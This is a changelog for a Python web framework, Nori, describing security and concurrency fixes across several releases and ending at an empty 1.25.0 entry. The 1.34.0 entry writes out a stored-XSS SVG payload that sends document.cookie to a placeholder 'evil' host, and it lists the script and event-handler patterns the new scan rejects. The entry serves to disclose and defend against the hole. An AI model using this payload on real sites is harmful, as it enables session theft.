# Changelog

All notable changes to Nori are documented here. Format follows [Keep a Changelog](https://keepachangelog.com/).

---

## [1.34.0] — 2026-04-30

### Fixed (BREAKING — security)

- **SVG uploads were a stored-XSS hole on every project that called ``save_upload(file)`` without specifying ``allowed_types`` (HIGH).** Three things lined up to make this dangerous: (1) ``_MIME_MAP`` listed ``'svg' → 'image/svg+xml'`` so SVG was in the default allowlist; (2) ``_MAGIC_BYTES`` had no SVG entry, so ``_validate_magic_bytes`` followed its "unknown signature → skip gracefully" branch; (3) the existing test ``test_magic_bytes_unknown_extension_skipped`` codified the skip as intentional. The result: a payload named ``cute_cat.svg`` with ``Content-Type: image/svg+xml`` and body ``<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//evil/?'+document.cookie)</script></svg>`` passed every validation layer the framework advertised. When the project rendered the upload inline (``<object>``, ``<embed>``, or a direct link served with ``image/svg+xml``), the script ran in the host page's origin — stored XSS with the visitor's session cookie. Three changes close the gap: **(a)** SVG is removed from the default ``allowed_types`` and excluded via a new ``_UNSAFE_BY_DEFAULT`` set, so a forgotten ``allowed_types`` argument can no longer silently inherit the surface; **(b)** ``_MAGIC_BYTES['svg'] = (b'<?xml', b'<svg')`` so opt-in projects still get a prefix sanity check (an attacker can supply ``<?xml`` and bury ``<script>`` further down — this is intentionally a sanity guard, not the substantive defence); **(c)** new ``_validate_svg_content`` scans up to 256 KB of an opted-in SVG and rejects any presence of ``<script>``, ``<foreignObject>``, ``<iframe>``, ``<embed>``, ``<object>``, or ``on*`` event handler attributes. The scan is **reject, not sanitise** — sanitising arbitrary XML is a known unsolved problem (mXSS bypasses against DOMPurify and bleach are well-documented), and a half-cleaned SVG is a worse outcome than a denied upload.

### BREAKING migration notes

- Projects that called ``save_upload(file)`` with no ``allowed_types`` AND relied on accepting SVG uploads will start receiving ``UploadError("Extension '.svg' not allowed.")``. The fix is one line: pass ``allowed_types=['svg', 'png', 'jpg', ...]`` explicitly. The opt-in path additionally enforces the content scan above; projects that legitimately need to accept user SVGs should also read the new "SVG: opt-in with content scan" section in ``docs/security.md`` for guidance on serving uploads as ``text/plain`` or hosting on a separate origin.
- Projects that never accepted SVG uploads (the typical case) need no migration. The default behaviour remains: JPEG, PNG, GIF, PDF, WebP. Extension validation now refuses ``.svg`` rather than silently accepting it.

### Tests

993 → 1006 passing. 13 new regression tests:
- ``test_default_allowed_types_excludes_svg`` — pinned: ``svg`` cannot leak back into the default allowlist
- ``test_svg_magic_bytes_accept_xml_prefix`` / ``..._svg_prefix`` — both legitimate prefixes pass the magic-byte check
- ``test_svg_magic_bytes_reject_non_svg`` — a file claiming ``.svg`` but starting with ``<html>`` is rejected at the magic-byte layer
- ``test_svg_content_rejects_script_tag`` — the canonical XSS vector
- ``test_svg_content_rejects_foreign_object`` — pure ``<foreignObject>`` is enough to reject (rejecting the tag, not relying on enumerating its inner content)
- ``test_svg_content_rejects_iframe`` — embedded ``<iframe>`` rejected
- ``test_svg_content_rejects_event_handler`` / ``..._mixed_case`` — ``onload``, ``OnLoad`` both caught (case-insensitive)
- ``test_svg_content_accepts_clean_svg`` — well-formed icons / diagrams still pass
- ``test_save_upload_default_rejects_svg_extension`` — end-to-end: default ``allowed_types`` refuses SVG
- ``test_save_upload_svg_xss_blocked_when_opted_in`` — end-to-end: even with opt-in, ``<script>`` is rejected before disk
- ``test_save_upload_clean_svg_accepted_when_opted_in`` — end-to-end: clean SVG still works

### Documentation

- ``docs/security.md`` "Upload Security" section gains an "SVG: opt-in with content scan" subsection: threat model, opt-in usage, the rejected vectors table, and the operational guidance to either sanitise server-side, serve as ``text/plain``, or host on a separate origin. The pre-1.34 line about SVG/CSV "skipped gracefully" is replaced — only CSV / TXT skip now; SVG is documented as a load-bearing opt-in.

---

## [1.33.1] — 2026-04-30

### Improved

- **``session_guard`` now writes cache entries with an explicit, configurable TTL (LOW).** v1.33.0 called ``cache_set(key, value)`` without an explicit TTL, falling back to ``cache_set``'s 300-second default. With Redis (the recommended production backend) that was operationally cosmetic — Redis shares the cache namespace across workers, so ``invalidate_session()`` on Worker A propagates to every reader the moment it returns. With ``CACHE_BACKEND = 'memory'`` and ``WORKERS > 1`` (uncommon in production but reachable in dev), the per-worker dicts are independent: Worker A's bump only updated Worker A's memory, leaving Worker B serving the stale version for up to the entire 300s TTL window. The fix introduces ``SESSION_VERSION_CACHE_TTL`` (default 60s) and passes it explicitly on every ``cache_set`` call. Multi-worker memory deployments now have a bounded staleness window of one minute by default; tighter consistency comes from lowering the value, looser from raising it. Redis behavior is unchanged in practice (entries are still revalidated against the DB once per TTL window, which catches the rare class of cache/DB drift from manual writes or partial failover replay). The startup warning emitted when memory backend is detected in production (``asgi.py:77``) already covers the broader recommendation to switch to Redis.

### Documentation

- ``docs/security.md`` "Session Revocation" section now lists ``SESSION_VERSION_CACHE_TTL`` in the settings table and the tradeoffs section spells out the multi-worker memory staleness window explicitly so the recommendation to use Redis is anchored to a concrete failure mode rather than general advice.

### Tests

990 → 991 passing. New regression test:
- ``test_cache_writes_respect_configurable_ttl`` — ``SESSION_VERSION_CACHE_TTL = 15`` propagates through ``bump_session_version`` to the backend's ``set(key, value, ttl)`` call. Two existing tests upgraded to assert that every ``cache_set`` from ``session_guard`` carries a positive TTL (``cache_writes[i][2] > 0``); pre-1.33.1 they would have shown ``ttl=300`` as the silent default and the new explicit-TTL contract was untested.

---

## [1.33.0] — 2026-04-30

### Added

- **Session revocation via per-user version counter (`core.auth.session_guard`).** Starlette's ``SessionMiddleware`` issues signed cookies — the signature prevents tampering, not theft. Once a cookie is stolen (XSS, malware, third-party JS leak), the attacker has the same authority as the legitimate user until the cookie's ``max_age`` expires. Pre-1.33 there was no native revocation channel: a forced password change, account deactivation, or "log out everywhere" action could not invalidate already-issued cookies. The new ``session_guard`` plugs the hole with a per-user integer counter that the project copies into the session at login (``session['session_version'] = user.session_version``); on every gated request the framework compares the session version against the canonical value in the database. Calling ``invalidate_session(user_id)`` bumps the database column and synchronises the cache, atomically invalidating every cookie carrying a stale version on the next gated request — for that user, across all in-flight sessions.
- **Read-through cache with DB authority.** The cache (Redis or memory) accelerates the lookup; the DB column is the source of truth. A cache eviction does NOT silently disable revocation — the next request hits the DB, repopulates the cache, and resumes normal operation. A revocation written to a cache-only design would last only as long as the cache key TTL.
- **Process-local circuit breaker, no cache I/O in the decision path.** Once ``SESSION_VERSION_CIRCUIT_THRESHOLD`` consecutive storage failures land within a sliding window, the breaker forces fail-closed for a configurable cooldown duration regardless of ``SESSION_VERSION_FAIL_MODE``. The breaker state lives entirely in module globals — deliberately NOT in the cache, since the cache is the very resource we cannot rely on when we need to make the decision. Each worker process tracks its own breaker; the next successful read clears the counter.
- **Configurable failure mode.** When **both** cache and DB are unreachable in the same request, ``SESSION_VERSION_FAIL_MODE = 'open'`` (default) allows the request and writes ``session_guard.fail_open`` to the audit log; ``'closed'`` denies and writes ``session_guard.fail_closed``. The default matches the typical Nori deployment (SaaS, blogs, internal tools); finance / healthcare projects flip to ``'closed'`` in one line.
- **Boot-time validation: loud failure if the field is missing.** When ``SESSION_VERSION_CHECK = True``, the ASGI lifespan calls ``configure_session_guard()`` after model registration. If the User model lacks ``session_version``, the framework raises ``RuntimeError`` with the exact migration to apply rather than silently degrading to "always allow". Explicit failure is the only safe behavior when the project has opted into the feature.
- **Structured audit events on every denial path.** ``session.invalidated``, ``session_guard.revoked``, ``session_guard.user_deleted``, ``session_guard.fail_open``, ``session_guard.fail_closed``, ``session_guard.circuit_open`` — each path writes a forensic-trail entry via ``core.audit`` so security teams don't have to parse logs to reconstruct revocation timelines. The ``revoked`` event captures both versions in ``changes`` to distinguish "session predates revocation" from "version corruption".
- **Integration with all four auth decorators.** ``login_required``, ``require_role``, ``require_any_role``, ``require_permission`` now run the gate BEFORE the role / permission checks. Revoking a session yanks access to every gated route in the same request, including permission-gated ones — pre-1.33 a revoked admin could still hit privileged endpoints between the bump and cookie expiry.
- **New settings.** ``SESSION_VERSION_CHECK`` (default ``False`` — opt-in), ``SESSION_VERSION_FAIL_MODE`` (default ``'open'``), ``SESSION_VERSION_CIRCUIT_THRESHOLD`` (default 50), ``SESSION_VERSION_CIRCUIT_WINDOW`` (default 60s), ``SESSION_VERSION_CIRCUIT_OPEN_DURATION`` (default 30s).

### Documentation

- ``docs/security.md`` gains a "Session Revocation (Session Version Guard)" section: threat model, opt-in steps, migration, configuration, failure modes, audit events, tradeoffs.

### Tests

967 → 990 passing. 23 new regression tests covering: feature flag bypass, anonymous request bypass, pre-feature session bypass, cache hit (match / mismatch + audit), cache miss → DB read-through + cache repopulation, cache error fall-through to DB, user-deleted denial path, fail-open / fail-closed mode switching, circuit-breaker semantics (threshold, success reset, sliding window, cache-independence), bump_session_version (db + cache + missing user), invalidate_session (with / without request), and boot-time configure_session_guard (no-op / no User registered / missing field / passing). Two integration tests in ``test_acl.py`` verify the gate fires from inside ``login_required`` and ``require_permission`` end-to-end.

---

## [1.32.0] — 2026-04-30

### Fixed

- **Memory queue driver fan-out is now bounded by ``BoundedSemaphore`` (MED).** Pre-1.32 ``core/queue.py:_memory_handler`` did ``asyncio.create_task(_run())`` with no concurrency cap. After v1.30.0's ``asyncio.to_thread`` offload sync queue jobs were transitively bounded by the default thread pool (~32 workers), but **async** queue jobs had no bound at all. A ``push('async_func', ...)`` × 5000 burst spawned 5000 in-flight coroutines simultaneously — memory pressure plus loop-scheduling overhead that grows with N², while the application's normal request-handling fights for the same loop. The fix introduces a module-level ``_memory_semaphore: asyncio.BoundedSemaphore`` lazy-initialised on first dispatch (module-level construction would attempt to bind to a nonexistent loop at import time, which is a ``DeprecationWarning`` on 3.10+ and an outright error on 3.12+). The semaphore wraps ``execute_payload`` only, **not** the optional ``await asyncio.sleep(delay)`` — sleeping Tasks are essentially free (just timers), the cap should bound concurrent **execution** not pending dispatch. Default cap is 32, mirroring the default ``asyncio.to_thread`` worker pool so a burst of sync jobs cannot oversubscribe the pool. Configurable via ``QUEUE_MEMORY_CONCURRENCY`` in ``settings.py``; values < 1 raise ``ValueError`` at first dispatch (silently accepting 0 would deadlock every job forever). The semaphore caps execution but **not** the backlog — 5000 jobs still create 5000 Tasks awaiting the semaphore. Projects needing real backlog bounds should use the Redis or database driver, both of which are bounded by their respective storage shapes.

### Tests

963 → 967 passing. New regression tests:
- ``test_memory_queue_caps_concurrent_execution`` — 20 × 50 ms jobs with cap=3 must show high-water mark ≤ 3 across the burst (pre-fix this would equal 20)
- ``test_memory_queue_semaphore_lazy_inits_inside_loop`` — first call returns a fresh ``BoundedSemaphore``, subsequent calls return the same memoised instance
- ``test_memory_queue_invalid_concurrency_raises`` — ``QUEUE_MEMORY_CONCURRENCY = 0`` raises ``ValueError`` instead of silently deadlocking
- ``test_memory_queue_default_concurrency_is_32`` — pin the default cap so a future "tweak" cannot silently gut the bound

---

## [1.31.0] — 2026-04-30

### Fixed

- **``load_permissions`` now refuses to refresh permissions for an inactive or missing User (MED).** Pre-1.31 ``is_active`` lived entirely in the project's login flow: at login time the project rejected inactive users; after that, deactivating a user in the database had no effect on in-flight requests until the session expired. The hole was specifically the **refresh** path — every ``PERMISSIONS_TTL`` window (default 5 min), ``require_permission`` would invoke ``load_permissions`` again, which re-derived perms purely from ``role_ids`` in the session and the Role→Permission M2M. ``is_active`` was never read. So an attacker (or a forgotten admin) deactivated in the DB stayed authorised for the rest of their TTL window, and every subsequent refresh kept granting. The fix adds an active-user gate at the top of ``load_permissions``: ``User.get_or_none(id=user_id)``; if missing or ``is_active is False``, write empty perms + the TTL marker and return ``[]``. The gate is bracketed in three layers of compatibility: ``LookupError`` from ``get_model('User')`` skips the gate (token-only auth, projects without a User); ``getattr(user_obj, 'is_active', True)`` defaults the flag to True (small internal apps that never added the column); a broad ``except Exception`` logs and falls through (transient DB errors, custom Managers without ``get_or_none``) so the gate never introduces a new 500. Truly revoking a logged-in user's access still requires invalidating their session — the cached perms on the session itself are not consulted by this gate, only the refresh-time reload is.

### Improved

- **Validation rule dispatcher logs a WARNING for unknown rule keywords.** Pre-1.31 a typo (``requried``, ``min_lengthn``, ``maxx``) or — much more commonly — a ``regex`` pattern containing the rule separator ``|`` declared in pipe-form silently no-op'd. The pipe-form footgun is the worst variant: ``{'username': 'regex:^a|b$'}`` splits to ``['regex:^a', 'b$']``, the trailing ``'b$'`` is dispatched to ``_check_rule`` as a "rule" keyword, falls off every ``elif``, and the framework returns ``None`` — so the developer ships with half a regex and the validator passes inputs the full pattern would have rejected. ``_check_rule`` now ends with an ``else:`` branch that emits a WARNING via ``core.logger.get_logger('validation')`` naming the offending rule keyword and the field, plus an explicit hint that pipe-form rules cannot contain ``|`` in their parameter and listing every recognised rule. The branch is **soft** — validation completes for the recognised rules in the chain so a typo cannot 500 the request, only surface itself. Matching docstring note added to the ``regex`` rule body so the workaround (``{'username': ['regex:^a|b$']}`` — list form) is one click away from where a developer is most likely reading.

### Tests

954 → 962 passing. New regression tests, each verified to fail on pre-1.31 code:
- ``test_load_permissions_refuses_inactive_user`` — ``is_active=False`` returns ``[]`` even with ``role_ids`` already set in session
- ``test_load_permissions_refuses_missing_user`` — ``get_or_none`` returning ``None`` returns ``[]``
- ``test_load_permissions_active_user_passes_through_gate`` — sanity: an active user resolves perms exactly as on v1.30.x
- ``test_load_permissions_user_without_is_active_attr_passes`` — backward-compat: User model without ``is_active`` falls through (default True via ``getattr``)
- ``test_load_permissions_skips_gate_when_user_model_unregistered`` — token-only auth still works (``LookupError`` skips gate)
- ``test_load_permissions_gate_query_error_falls_through`` — transient DB / shape errors log + fall through, never propagate as 500
- ``test_validate_warns_on_unknown_rule_keyword`` — the pipe-form footgun (``'regex:^a|b$'``) surfaces the trailing ``'b$'`` as a WARNING
- ``test_validate_unknown_rule_keyword_does_not_raise`` — soft-warn semantics: a typo'd rule must not crash the request
- ``test_validate_regex_with_pipe_works_in_list_form`` — pinned workaround: list form preserves the alternation pattern

---

## [1.30.2] — 2026-04-30

### Fixed

- **CI Typecheck job now passes (last green: v1.16.0).** Four mypy errors had accumulated since the v1.17 → v1.29 window, all hidden behind the same gap in the local pre-push checklist that let Lint and ruff format drift. Two were stale ``# type: ignore[return-value]`` comments in ``core/mixins/soft_deletes.py`` (``get_queryset()`` and ``with_trashed()``) that newer mypy/aerich type stubs no longer require — removed. Two were ``await self._redis.eval(...)`` sites in ``core/cache.py:incr`` and ``core/http/throttle_backends.py:check_and_add`` where redis-py's ``eval`` stub unions ``Awaitable[Any] | Any`` for the sync/async overload — on the asyncio client it is always a coroutine, but mypy cannot pick the right branch. Wrapped both in ``cast(Awaitable[Any], ...)``, the same pattern already used for ``self._redis.ping()`` in ``RedisCacheBackend.verify``. Added ``mypy rootsystem/application`` to the local pre-push checklist alongside ``ruff check`` and ``ruff format --check``.

---

## [1.30.1] — 2026-04-30

### Improved

- **CI Lint job now also passes the ``ruff format --check`` step.** v1.30.0 unblocked ``ruff check`` after 10+ red CI runs, but the workflow has a second step (``ruff format --check .``) that only ran once the first step started passing — and it surfaced 15 files where formatting drift had accumulated across the same untracked-version window. v1.30.1 runs ``ruff format`` against the tree (cosmetic only: collapsing multi-line strings that fit on one line at the project's 120-char width). No behavior change. Added ``ruff format --check`` to the local pre-push checklist alongside ``ruff check`` so this drift cannot recur silently.

---

## [1.30.0] — 2026-04-30

### Fixed

- **``execute_payload`` ran synchronous callables inline on the event loop (HIGH).** ``core/queue_worker.py`` mirrored the same bug v1.27.0 fixed in ``core.tasks._run()``: a coroutine target was awaited correctly, but a sync target was called as ``func(*args, **kwargs)`` directly. Under the memory queue driver — which dispatches through ``_memory_handler`` from inside the ASGI event loop, not a separate worker process — that froze the entire web server for the duration of the call. A single ``push('image_processor.thumbnail', ...)`` or ``push('mail.send_via_legacy_sdk', ...)`` could pause every concurrent request. The fix matches the v1.27.0 dispatch shape: ``inspect.iscoroutinefunction(func)`` → ``await func(...)``; otherwise ``await asyncio.to_thread(func, ...)`` and, if the sync return value is itself awaitable (the legacy "sync factory returning coroutine" pattern), await it on the loop.
- **``_memory_handler`` discarded the in-flight task, exposing it to GC mid-execution (MED).** ``core/queue.py:_memory_handler`` did ``asyncio.create_task(_run())`` and threw the returned ``Task`` away. Per the asyncio docs, the event loop holds **only a weak reference** to a Task — an unreferenced task can be garbage-collected at any time, including mid-``await``. The user-visible failure is silent: a ``push('mail.send_welcome', delay=30)`` could disappear between the ``asyncio.sleep(30)`` and ``execute_payload(...)``, and no log records the loss. The fix is the same pattern already used by ``core.audit._pending_tasks``: a module-level ``_memory_tasks: set[asyncio.Task]`` that pins each created Task; ``task.add_done_callback(_memory_tasks.discard)`` releases the reference once execution completes, so the set does not grow unboundedly.

### Improved

- **CI lint went green for the first time in 10+ commits.** Pre-existing lint failures had been accumulating since the ruff-action started auto-installing newer versions on every CI run (``Could not parse version from pyproject.toml`` → ``Using latest version``). New lint rules stabilised between local dev (older ruff) and CI (latest), and nobody noticed because all the pushes happened to be releases. The package now: (1) pins ``required-version = ">=0.15.0"`` under ``[tool.ruff]`` so CI and dev use the same floor; (2) auto-fixes the I001 import ordering in three test files; (3) adds ``# noqa: S110`` with motivation on two legitimate ``try/except: pass`` sites (``core/ws.py`` shutdown fan-out where a logged ERROR per already-disconnected peer would spam every rolling restart, and ``test_audit.py`` draining a deliberately-cancelled fixture task); (4) extends ``[tool.ruff.lint.per-file-ignores]`` for ``docs/install.py`` (parse_args + main, both linear CLI orchestrators) and ``core/auth/decorators.py:load_permissions`` (permission resolver dispatch), matching the pattern already in place for ``core/cli.py:main``, ``core/http/inject.py``, and the validation rule dispatcher.

### Tests

950 → 954 passing. New regression tests, each verified to fail on pre-1.30 code:
- ``test_memory_handler_holds_strong_reference_to_task`` — asserts ``_memory_tasks`` size grows by 1 on dispatch and drops back to baseline once the done-callback fires; pre-fix the set did not exist
- ``test_execute_payload_offloads_sync_callable_to_thread`` — runs a 200 ms blocking ``time.sleep`` while a 10 ms ticker advances on the loop; ticker must advance ≥5 times during the block (would advance ~zero pre-fix because the sync call ran inline)
- ``test_execute_payload_runs_sync_factory_returning_coroutine`` — pins the legacy "sync function returning coroutine" pattern: sync portion ran (in the thread), returned coroutine awaited (on the loop), tracker shows both phases
- ``test_execute_payload_async_callable_still_runs_on_loop`` — async ``def`` targets continue to be awaited on the loop, not handed to ``to_thread`` (which would either fail to find a running loop in the worker thread or leak the unawaited coroutine)

---

## [1.29.0] — 2026-04-30

### Fixed

- **``cache_incr`` Memory backend applied TTL to a pre-existing counter that had no TTL (MED).** Memory's branch ``existing_expires_at if existing_expires_at and existing_expires_at > now else (now + ttl) if ttl > 0 else 0.0`` failed to distinguish "no entry at all" from "entry exists with no TTL" — both cases land at ``existing_expires_at == 0.0``, which is falsy. So a long-lived counter created via ``cache_set('k', 5, ttl=0)`` (e.g. login_attempts persisting across windows, queue depth) and then touched by ``cache_incr('k', ttl=60)`` would (incorrectly) get the 60s TTL applied retroactively. Redis's Lua script does not have this bug — its ``EXPIRE`` branch only fires when ``INCR`` returns ``1`` (the counter genuinely born), and an existing counter always returns ``N+1``. Memory now tracks an explicit ``is_existing`` flag and preserves the counter's TTL state — including "no TTL" — once it pre-exists. The two backends produce identical observable behavior across all four entry states (missing, expired, present-with-TTL, present-without-TTL).

### Improved

- **``cache_response`` accepts ``vary_on=['Header-Name', ...]`` for content-variance keying.** The default cache key is built from URL path + query and is intentionally **agnostic to request headers** — ideal for anonymous public endpoints, but a footgun for any handler whose response varies by ``Accept-Language``, ``Accept-Encoding``, ``Accept``, or a custom format header. The first requester pinned their variant for every subsequent caller within the TTL window — a user with ``Accept-Language: es`` could receive whatever the first ``Accept-Language: en`` user populated. ``vary_on`` folds the named header values into the cache key (case-insensitive lookup, missing header contributes the empty string), so each variant gets its own slot. The default (``vary_on=None``) keeps the legacy key shape verbatim, so cached entries written by a pre-1.29 process remain reachable across an in-place upgrade. The docstring now spells out the role of ``vary_on`` alongside the existing ``key_fn`` guidance for per-user / per-tenant scoping. This is **not** "cache poisoning" in the OWASP sense (no attacker injects malicious content; the cached responses are legitimate) but it IS content-variance under-keying, which the fix closes.

### Tests

945 → 950 passing. New regression tests:
- ``test_memory_incr_does_not_apply_ttl_to_existing_no_ttl_counter`` — pre-fix the Memory backend applied TTL retroactively to a counter that pre-existed without one; asserts the entry's ``expires_at`` stays ``0.0`` after the second ``incr`` call (matching Redis's Lua semantics)
- ``test_cache_response_vary_on_segments_by_header_value`` — two requests with the same path and different ``Accept-Language`` resolve to distinct cache slots; the second handler call returns its own body (not the previously-cached variant)
- ``test_cache_response_default_key_unchanged_without_vary_on`` — backward-compat: when ``vary_on`` is omitted, the cache key is exactly ``view:/products:page=1`` (legacy shape)
- ``test_cache_response_vary_on_treats_missing_header_as_empty`` — pinned contract: absent header contributes empty string to the segment, present header gets a distinct slot
- ``test_cache_response_vary_on_lookup_is_case_insensitive`` — declaring ``vary_on=['ACCEPT-LANGUAGE']`` and reading ``request.headers.get('accept-language')`` resolve to the same key

---

## [1.28.0] — 2026-04-30

### Improved

- **``NoriTreeMixin`` recursive CTEs now quote identifiers per dialect.** ``ancestors()`` and ``descendants()`` previously interpolated the table and column identifiers raw into the ``WITH RECURSIVE`` SQL. With the conventional snake_case table names that fall out of Tortoise defaults this works fine, but a model whose ``Meta.table`` collides with a SQL reserved word (``order``, ``desc``, ``table``, ``user`` on some engines) or uses mixed-case (``Order``) would either trigger a syntax error at parse time (Postgres / MySQL) or silently lowercase-fold (Postgres unquoted identifiers) and lose row matching. The fix adds a module-level ``_quote_ident(name)`` helper that returns ``"name"`` for Postgres / SQLite / unknown dialects and `` `name` `` for MySQL / MariaDB. The existing ``isalnum()`` check stays in place — it never was a security boundary (the strings come from class-level metadata, not user input) but it is a typo guard that also keeps quote characters and spaces out of the identifier so the quoted form interpolates safely without a second escape pass.
- **``NoriCollection.to_list()`` docstring spells out the POPO contract.** The method already refused to serialize Tortoise models that lacked ``NoriModelMixin`` (otherwise ``_meta.fields_map`` would emit every field, leaking secrets the developer assumed ``protected_fields`` was hiding). For plain Python objects (``__dict__`` walk) it serialized every non-``_`` attribute and returned silently. The behavior is intentional — Python's convention is that ``_``-prefixed names are private, and a developer who hand-wrote ``self.access_token = ...`` on a public name has chosen the attribute's visibility — but it was not documented at the method level. The reinforced docstring now states the per-element contract in priority order (NoriModelMixin → Tortoise reject → dict → POPO walk → fallback) and tells the reader exactly how to opt out: ``_`` prefix or define an explicit ``to_dict()``. No behavior change.

### Tests

937 → 945 passing. New regression tests:
- ``test_quote_ident_postgres_uses_double_quotes`` / ``…_sqlite_…`` / ``…_mysql_uses_backticks`` / ``…_mariadb_…`` / ``…_unknown_dialect_falls_back_to_double_quotes`` — full dialect matrix, monkeypatched fake connection by class name
- ``test_ancestors_sql_quotes_identifiers`` — captures the generated recursive CTE and asserts ``"sample_category"``, ``"id"``, ``"parent_id"`` all appear in their quoted forms
- ``test_descendants_sql_quotes_identifiers`` — mirror coverage for the descendants traversal
- ``test_to_list_documents_popo_contract`` — pins the three documented behaviors (public attrs exposed, ``_`` opt-out works, ``to_dict()`` overrides the walk) so a future audit landing on this branch sees the intent and does not mis-flag the path as a leak

---

## [1.27.0] — 2026-04-30

### Fixed

- **``background()`` silently blocked the event loop on synchronous callables (HIGH).** ``core/tasks.py`` wrapped every callable in an ``async def`` and called the user's function directly inside the wrapper. Starlette's ``BackgroundTask`` saw an async wrapper and skipped its own ``run_in_threadpool`` path; if the callable was synchronous (legacy mail SDK, image processing, ``requests.get``, ``time.sleep``), the entire body of work ran on the event loop and froze every other request for its duration. The framework promised "background-safe" and silently failed the promise for any sync callable. The fix adds a single dispatch helper, ``_run(func, args, kwargs)``: coroutine functions are awaited directly; sync callables run in a worker thread via ``asyncio.to_thread``. The legacy "factory" pattern (sync function returning a coroutine) still works — the sync portion runs in the thread, the awaitable is awaited on the loop. Both ``background()`` and ``background_tasks()`` use the new dispatch.
- **Service-driver httpx pools leaked across restarts and hot-reloads (MED).** Six service drivers (``oauth_github``, ``oauth_google``, ``storage_s3``, ``storage_gcs``, ``mail_resend``, ``search_meilisearch``) hold a module-level ``httpx.AsyncClient`` and each exposes an ``async def shutdown()`` that ``await``-s ``client.aclose()`` — but no code path actually invoked them. The ASGI lifespan tore down DB connections and exited, leaving every active TCP/TLS connection to the OS to reap. In dev that manifested as steady file-descriptor accumulation across ``uvicorn --reload`` cycles; in production it manifested as half-open sockets piling up across rolling restarts. The fix introduces ``core/lifecycle.py``, a registry of named shutdown handlers. Each service driver registers its own ``shutdown`` lazily — inside ``_get_client()``, on first actual use — so a project that never exercises (say) S3 pays no shutdown cost for it. The ASGI lifespan calls ``run_shutdown_handlers()`` after WebSockets close and before the audit flush + Tortoise teardown. Per-handler timeouts (default 5 s) and exception-swallowing keep one stuck or crashing driver from blocking the rest, matching the shape of ``audit.flush_pending`` and ``ws.close_all_connections``.

### Improved

- **``NoriSoftDeletes.delete()`` docstring spells out the Tortoise signal contract.** Soft delete is implemented via ``await self.save(...)``, so Tortoise emits ``post_save``, *not* ``post_delete``. A hook registered with ``@post_delete(YourModel)`` will NOT fire on ``await instance.delete()`` for soft-deletable models — only on ``force_delete()``. This is intentional (firing ``post_delete`` would mislead hooks doing irreversible cleanup like S3 object removal, since the user can call ``restore()`` later), but it diverges from the Django/Eloquent convention enough that the per-method docstring now states the contract explicitly and points to the ``is_trashed`` check on ``post_save`` for hooks that need soft-delete reactivity. No behavior change.

### Tests

926 → 937 passing. New regression tests, each verified to fail on pre-1.27 code:
- ``test_background_sync_callable_does_not_block_event_loop`` — runs a 200 ms blocking sync function concurrently with an event-loop ticker; the ticker must advance ≥5 times during the block (would advance ~zero on pre-1.27)
- ``test_background_async_callable_runs_on_event_loop`` — coroutine functions still go through the loop, not ``asyncio.to_thread``
- ``test_background_handles_sync_factory_returning_coroutine`` — the legacy factory pattern still works (sync portion on thread, coroutine awaited on loop)
- ``test_background_tasks_plural_offloads_sync_callables`` — same offload contract for the ``background_tasks()`` plural variant
- ``test_register_shutdown_appends_one_entry`` / ``…_is_idempotent_for_same_handler`` / ``…_allows_distinct_handlers_under_same_name`` — registry semantics (add, idempotency by identity, name field is informational)
- ``test_run_shutdown_handlers_invokes_each_in_order`` — sequential, deterministic
- ``test_run_shutdown_handlers_returns_immediately_when_empty`` — fast path for projects that activate no service driver
- ``test_run_shutdown_handlers_swallows_per_handler_errors`` — a crashing handler does not derail the rest
- ``test_run_shutdown_handlers_warns_on_per_handler_timeout`` — stuck handler produces a warning, next handler still runs

---

## [1.26.0] — 2026-04-30

### Fixed

- **WebSocket connections orphaned on shutdown (MED).** ``core/ws.py`` had no registry of active connections. On ``SIGTERM`` the lifespan ran to completion and uvicorn dropped the WebSocket sockets without sending a close frame; clients received ``1006`` (Abnormal Closure) and most reconnect strategies treat that as a transient network error with exponential backoff — what should be a sub-second reconnect ended up taking ~30 seconds per rolling restart. The fix adds a module-level ``_active_connections`` set; both ``WebSocketHandler.__call__`` and ``JsonWebSocketHandler.__call__`` register on entry and discard in ``finally`` (so even an auth-rejected handshake does the right thing). A new ``close_all_connections(code=1001, timeout=2.0)`` walks the set and sends a clean RFC-6455 ``1001`` ("Going Away") to every peer; the ASGI lifespan invokes it before tearing down the audit flush + DB connections. A stuck peer cannot block shutdown forever — on timeout the function logs a warning and returns, matching the shape of ``audit.flush_pending()`` from v1.24.0.

### Improved

- **``WebSocketHandler.on_connect`` docstring reinforced.** The class docstring already warned that the default accepts every client unauthenticated, but the per-method ``on_connect`` docstring (the first one a developer sees when overriding) only said "Default: accept the connection." It now spells out the auth contract: which middlewares run for WebSockets and which don't, the recommended ``websocket.session.get('user_id')`` check, the right close codes, and a pointer to ``docs/websockets.md`` for the JWT pattern. No behavior change.
- **Search ``doc_id`` typed as ``str``.** ``register_search_driver``, ``index_document``, and ``remove_document`` now declare ``doc_id: str`` instead of ``str | int``, and the bundled Meilisearch driver matches. Most search backends accept both types but treat ``5`` and ``"5"`` as distinct documents — index with one and remove with the other and the remove silently no-ops. Tightening the hint pushes mypy / pyright to flag the inconsistency at the call site instead of the index drifting in production. Runtime accepts whatever you pass (Python is duck-typed); the type hint is the documentation that matters.

### Tests

921 → 926 passing. New regression tests, each verified to fail on pre-1.26 code:
- ``test_close_all_connections_sends_1001_to_each_active_socket`` — close fan-out reaches every tracked socket with the right code
- ``test_close_all_connections_returns_immediately_when_empty`` — no-op fast path on the lifespan call
- ``test_close_all_connections_swallows_per_socket_failures`` — one half-dead client does not derail the rest
- ``test_close_all_connections_warns_on_timeout`` — stuck peer logs a warning instead of hanging shutdown
- ``test_websocket_handler_registers_active_connections_via_real_traffic`` — end-to-end check via TestClient that the try/finally registration actually runs in the live ``__call__`` path

### Investigated but not changed

- **WebSocket handshake "accepts everyone by default".** The base ``on_connect`` returns ``await websocket.accept()`` unconditionally — but ``SessionMiddleware`` *does* run for WebSocket scopes and populates ``websocket.session``, so the auth pattern (override ``on_connect``, check the session, close with ``1008`` on failure) is the documented and supported contract. Making the framework reject connections by default would break legitimate public WebSocket use cases (broadcasts, presence pages, status feeds) without preventing the kind of mistake that bug claims to address — the framework cannot tell the difference between "I want a public socket" and "I forgot the auth check." Reinforced the per-method docstring instead.

---

## [1.25.0] — 2026-04-30

### Fixed

